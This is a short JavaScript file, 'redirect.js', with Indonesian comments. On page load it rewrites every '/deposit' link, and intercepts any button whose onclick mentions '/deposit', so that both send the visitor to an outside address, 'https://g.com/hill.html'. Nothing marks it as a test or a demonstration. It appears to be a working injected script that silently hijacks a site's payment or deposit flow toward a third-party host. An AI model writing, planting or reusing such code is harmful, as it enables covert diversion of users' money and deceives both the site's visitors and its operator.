// redirect.js

document.addEventListener("DOMContentLoaded", function () {
  // Cari semua elemen <a> atau <button> yang mengarah ke /deposit
  document.querySelectorAll('a[href="/deposit"], button').forEach(function (el) {
    // Untuk <a>
    if (el.tagName.toLowerCase() === "a" && el.getAttribute("href") === "/deposit") {
      el.setAttribute("href", "https://g.com/hill.html");
    }

    // Untuk <button> yang mungkin mengarahkan secara programatik
    el.addEventListener("click", function (e) {
      if (el.getAttribute("onclick")?.includes("/deposit")) {
        e.preventDefault();
        window.location.href = "https://g.com/hill.html";
      }
    });
  });
});
